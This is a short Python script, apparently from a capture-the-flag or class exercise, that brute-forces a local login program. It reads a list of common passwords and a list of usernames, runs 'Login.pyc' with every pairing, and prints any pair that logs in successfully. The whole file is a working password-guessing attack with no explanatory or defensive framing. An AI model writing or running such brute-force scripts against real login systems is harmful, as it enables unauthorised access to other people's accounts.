import os
import time
import subprocess

def _break():
    f = open("MostCommonPWs", "r")
    Passwords = [line.rstrip('\n') for line in f]
    d = open("gang", "r")
    Names = [line.rstrip('\n') for line in d]
    for nme in Names:
        for pwd in Passwords:
            output = subprocess.run(["python3", "Login.pyc", nme, pwd], capture_output = True, text = True).stdout.strip("\n")
            if "success" in output:
                print("The Working Password For ", nme,"Is", pwd)
                break

_break()
